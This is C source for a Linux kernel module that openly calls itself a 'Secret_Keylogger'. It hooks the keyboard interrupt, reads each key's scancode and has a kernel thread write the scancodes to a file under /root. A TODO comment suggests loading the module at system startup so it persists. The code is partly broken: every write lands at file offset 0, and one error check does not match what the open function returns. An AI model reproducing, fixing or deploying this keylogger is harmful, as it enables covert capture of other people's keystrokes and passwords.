/*
 * kb.c
 */

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/interrupt.h>
#include <asm/io.h>

#include <linux/fs.h>
#include <asm/segment.h>
#include <asm/uaccess.h>
#include <linux/buffer_head.h>
#include <linux/string.h>

#include <linux/kthread.h>
#include <linux/sched.h>

#define KB_IRQ 1

const char* NAME = "---Secret_Keylogger---";
struct file* log_fp;
unsigned char g;
struct task_struct *logger;

/* =================================================================== */

struct file* log_open(const char *path, int flags, int rights)
{
	struct file *fp = NULL;
	mm_segment_t old_fs;
	int error = 0;

	old_fs = get_fs();
	set_fs(get_ds());
	fp = filp_open(path, flags, rights);
	set_fs(old_fs);

	if(IS_ERR(fp)){
		error = PTR_ERR(fp);
		printk("log_open(): ERROR = %d", error);
		return NULL;
	}

	return fp;
}

void log_close(struct file *fp)
{
	filp_close(fp, NULL);
}

int log_write(struct file *fp, unsigned long long offset, unsigned char *data,
		unsigned int size)
{
	mm_segment_t old_fs;
	int ret;

	old_fs = get_fs();
	set_fs(get_ds());

	ret = vfs_write(fp, data, size, &offset);

	set_fs(old_fs);
	return ret;
}

/* =================================================================== */

int kthread_log_keystrokes(void *data)
{
	char c = 0x00;
	{
		char buf[16];
		memset(buf, 0, sizeof(buf));
		strcpy(buf, "Test!\n");
		log_write(log_fp, 0, buf, sizeof(buf));
	}

	while(!kthread_should_stop()){
		schedule();
		if(c != g){
			char buf[16];
			memset(buf, 0, sizeof(buf));
			sprintf(buf, "[%d]", c);
			log_write(log_fp, 0, buf, sizeof(buf));
		}
		c = g;
	}
}

irq_handler_t kb_irq_handler(int irq, void *dev_id, struct pt_regs *regs)
{
	static unsigned char scancode, status;

	scancode = inb(0x60);
	status = inb(0x64);

	if(scancode == 0x02 || scancode == 0x82){
		printk("You pressed ESC!\n");
	}
	else{
		g = scancode;
	}
	/* TODO:
	 * Writing to a file during an ISR crashes the system, so
	 * fill a queue/buffer and then write out this buffer to the 
	 * log in a non-atomic context where sleeping is allowed.
	 * e.g., a tasklet
	 */
	
	return (irq_handler_t)IRQ_HANDLED;
}

static int __init kb_init(void)
{
	int ret;

	/* TODO:
	 * Insert module into system startup by adding to /etc/modules.conf?
	 * Note this file may be different for each distro
	 */

	log_fp = log_open("/root/test.txt", O_WRONLY | O_CREAT, 0644);
	if(IS_ERR(log_fp)){
		printk("FAILED to open log file.\n");
		return 1;
	}
	else{
		printk("SUCCESSFULLY opened log file.\n");
		unsigned char buf[32];
		memset(buf, 0, sizeof(buf));
		strcpy(buf, "[a][a]\n[b][b]\n");
		log_write(log_fp, 0, buf, sizeof(buf));
		logger = kthread_run(&kthread_log_keystrokes, NULL, "pradeep");
		printk("KERNEL THREAD: %s\n", logger->comm);		
	}

	ret = request_irq(KB_IRQ, (irq_handler_t)kb_irq_handler, IRQF_SHARED,
			NAME, (void*)(kb_irq_handler));
	if(ret != 0){
		printk(KERN_INFO "FAILED to request IRQ for keyboard.\n");
	}

	return ret;
}

static void __exit kb_exit(void)
{
	kthread_stop(logger);
	free_irq(KB_IRQ, (void*)(kb_irq_handler));
	if(log_fp != NULL){
		log_close(log_fp);
	}
}

MODULE_LICENSE("GPL");
module_init(kb_init);
module_exit(kb_exit);

/* EXPORT_NO_SYMBOLS; */
